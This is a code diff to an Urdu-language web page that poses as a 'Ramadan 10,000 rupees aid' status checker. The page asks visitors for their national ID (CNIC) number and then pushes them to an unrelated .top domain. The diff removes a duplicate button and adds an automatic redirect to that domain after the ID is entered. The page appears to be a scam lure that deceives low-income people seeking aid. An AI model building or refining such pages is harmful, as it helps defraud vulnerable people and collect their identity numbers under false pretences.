@@ -93,6 +93,7 @@
     </style>
 </head>
 <body>
+
     <div class="container">
         <h1>رمضان 10,000 روپے امداد کی سٹیٹس چیک کریں!</h1>
         <p class="instructions">سبز بٹن پر کلک کریں ۔</p>
@@ -100,12 +101,9 @@
         <button onclick="showMessage()">سٹیٹس چیک کریں</button>
         <div class="message" id="message">
             <p>آپ کی درخواست پر کارروائی جاری ہے۔ نیچے سبز بٹن پر کلک کریں، پھر ایک گھنٹے بعد دوبارہ چیک کریں۔</p>
-۔</p>         <button class="green-button" id="greenButton" onclick="window.location.href='https://echifobi.top/4/9058827'">سبز بٹن</button>
-
+            <button class="green-button" id="greenButton" onclick="window.location.href='https://echifobi.top/4/9058827'">سبز بٹن</button>
             <p class="time-message">اگلی چیک: <span id="time"></span></p>
         </div>
-
-        <button class="green-button" id="greenButton" onclick="window.location.href='https://echifobi.top/4/9058827'">سبز بٹن</button>
     </div>
 
     <script>
@@ -120,6 +118,11 @@
                 now.setHours(now.getHours() + 1);
                 const timeString = now.toLocaleTimeString('ur-PK', { hour: '2-digit', minute: '2-digit' });
                 document.getElementById('time').textContent = timeString;
+
+                // Open the link after 4 seconds
+                setTimeout(function() {
+                    window.location.href = 'https://echifobi.top/4/9058827';
+                }, 5000);
             } else {
                 alert('براہ کرم اپنا CNIC نمبر درج کریں۔');
             }
